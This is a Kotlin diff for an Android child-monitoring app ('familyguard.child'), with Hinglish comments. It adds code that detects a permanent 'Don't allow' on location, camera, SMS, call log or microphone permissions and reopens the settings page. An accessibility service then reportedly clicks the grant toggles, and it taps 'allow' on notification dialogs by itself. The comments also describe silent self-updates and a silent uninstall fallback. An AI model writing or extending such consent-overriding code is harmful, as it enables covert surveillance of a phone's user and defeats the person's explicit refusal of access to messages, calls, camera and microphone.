@@ -2,6 +2,7 @@ package com.familyguard.child
 
 import android.Manifest
 import android.annotation.SuppressLint
+import android.app.Activity
 import android.app.AppOpsManager
 import android.content.ComponentName
 import android.content.Context
@@ -19,6 +20,7 @@ import androidx.activity.compose.rememberLauncherForActivityResult
 import androidx.activity.compose.setContent
 import androidx.activity.result.ActivityResultLauncher
 import androidx.activity.result.contract.ActivityResultContracts
+import androidx.core.app.ActivityCompat
 import androidx.compose.foundation.layout.Arrangement
 import androidx.compose.foundation.border
 import androidx.compose.foundation.layout.Box
@@ -138,6 +140,38 @@ class MainActivity : ComponentActivity() {
             ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED ||
             ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
 
+    /**
+     * Android 14/15 permanent-denial recovery — call log/SMS empty hone ki #1 wajah.
+     *
+     * Runtime permission par ek baar "Don't allow" (ya MIUI/ColorOS ka auto-deny)
+     * hone ke baad system dialog DOBARA KABHI NAHI KHULTA: har launch() chupchap
+     * dead response deta hai, AutoStep time-out ho jata hai, aur call log/SMS
+     * hamesha ke liye empty rehte hain. Detect: result me sab denied + kisi perm
+     * par shouldShowRequestPermissionRationale false → system ab dialog dikhayega
+     * hi nahi. Tab app-details settings page kholte hain jahan toggles se grant
+     * hota hai (EnforcementService us page par sirf armed step ke allow-listed
+     * text click karta hai — "Force stop"/"Uninstall" par kabhi nahi, isliye safe).
+     */
+    private fun maybeOpenPermSettings(ctx: Context, perms: List<String>) {
+        if (perms.isEmpty()) return
+        if (!Store.paired || Store.released) return
+        val anyGranted = perms.any {
+            ContextCompat.checkSelfPermission(ctx, it) == PackageManager.PERMISSION_GRANTED
+        }
+        if (anyGranted) return
+        val activity = ctx as? Activity ?: return
+        val dialogDead = perms.all {
+            !ActivityCompat.shouldShowRequestPermissionRationale(activity, it)
+        }
+        if (!dialogDead) return // simple denial — agla dialog attempt kaam karega
+        runCatching {
+            activity.startActivity(
+                Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:" + activity.packageName))
+                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            )
+        }
+    }
+
     private fun hasBatteryIgnore(ctx: Context): Boolean {
         val pm = ctx.getSystemService(Context.POWER_SERVICE) as PowerManager
         return pm.isIgnoringBatteryOptimizations(ctx.packageName)
@@ -173,6 +207,7 @@ class MainActivity : ComponentActivity() {
         camLauncher: ActivityResultLauncher<String>,
         callsLauncher: ActivityResultLauncher<Array<String>>,
         micLauncher: ActivityResultLauncher<String>,
+        postNotifLauncher: ActivityResultLauncher<String>,
         onProgress: (String) -> Unit
     ): String {
         data class AutoStep(val key: String, val done: () -> Boolean, val launch: () -> Unit, val timeoutMs: Long = 30_000L)
@@ -211,6 +246,14 @@ class MainActivity : ComponentActivity() {
                 )
             }),
             AutoStep("mic", { hasMic(ctx) }, { micLauncher.launch(Manifest.permission.RECORD_AUDIO) }),
+            // Android 13+ (14/15 included): POST_NOTIFICATIONS grant na ho to
+            // bachche ke phone par parent ka message notification, screen-share
+            // notification aur silent uninstall fallback — KUCH bhi visible nahi
+            // hota. Runtime dialog par EnforcementService "allow" khud click karta hai.
+            AutoStep("postnotif", {
+                Build.VERSION.SDK_INT < 33 ||
+                    ContextCompat.checkSelfPermission(ctx, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
+            }, { postNotifLauncher.launch(Manifest.permission.POST_NOTIFICATIONS) }),
             AutoStep("battery", { hasBatteryIgnore(ctx) }, { requestIgnoreBattery(ctx) }),
             // Silent self-update ke liye EK BAAR "install unknown apps" chahiye —
             // iske bina naya GitHub build auto-install nahi ho sakta.
@@ -274,10 +317,19 @@ class MainActivity : ComponentActivity() {
         var firedOnOpen by remember { mutableStateOf(false) }
 
         // launchers for the self-driving permission sequence (auto-run after pairing)
-        val locLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {}
-        val camLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestPermission()) {}
-        val callsLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {}
-        val micLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestPermission()) {}
+        val locLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { result ->
+            maybeOpenPermSettings(this@MainActivity, result.keys.toList())
+        }
+        val camLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestPermission()) { granted ->
+            if (!granted) maybeOpenPermSettings(this@MainActivity, listOf(Manifest.permission.CAMERA))
+        }
+        val callsLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { result ->
+            maybeOpenPermSettings(this@MainActivity, result.keys.toList())
+        }
+        val micLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestPermission()) { granted ->
+            if (!granted) maybeOpenPermSettings(this@MainActivity, listOf(Manifest.permission.RECORD_AUDIO))
+        }
+        val postNotifLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestPermission()) {}
         var autoBusy by remember { mutableStateOf(false) }
         var autoMsg by remember { mutableStateOf("") }
         var autoSetupDone by remember { mutableStateOf(false) }
@@ -329,7 +381,7 @@ class MainActivity : ComponentActivity() {
             autoBusy = true
             autoMsg = "Auto-setup chal raha hai…"
             autoMsg = autoGrantSequence(
-                this@MainActivity, locLauncher, camLauncher, callsLauncher, micLauncher
+                this@MainActivity, locLauncher, camLauncher, callsLauncher, micLauncher, postNotifLauncher
             ) { p -> autoMsg = p }
             autoBusy = false
             if (coreDone()) {
@@ -474,10 +526,19 @@ class MainActivity : ComponentActivity() {
         val ctx = LocalContext.current
         val scope = rememberCoroutineScope()
 
-        val locLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {}
-        val camLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestPermission()) {}
-        val callsLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {}
-        val micLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestPermission()) {}
+        val locLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { result ->
+            maybeOpenPermSettings(ctx, result.keys.toList())
+        }
+        val camLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestPermission()) { granted ->
+            if (!granted) maybeOpenPermSettings(ctx, listOf(Manifest.permission.CAMERA))
+        }
+        val callsLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { result ->
+            maybeOpenPermSettings(ctx, result.keys.toList())
+        }
+        val micLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestPermission()) { granted ->
+            if (!granted) maybeOpenPermSettings(ctx, listOf(Manifest.permission.RECORD_AUDIO))
+        }
+        val postNotifLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestPermission()) {}
         val adminLauncher = rememberLauncherForActivityResult(ActivityResultContracts.StartActivityForResult()) {}
         var autoMsg by remember { mutableStateOf("") }
         var autoBusy by remember { mutableStateOf(false) }
@@ -502,7 +563,7 @@ class MainActivity : ComponentActivity() {
                     autoBusy = true
                     scope.launch {
                         autoMsg = autoGrantSequence(
-                            ctx, locLauncher, camLauncher, callsLauncher, micLauncher
+                            ctx, locLauncher, camLauncher, callsLauncher, micLauncher, postNotifLauncher
                         ) { p -> autoMsg = p }
                         autoBusy = false
                     }
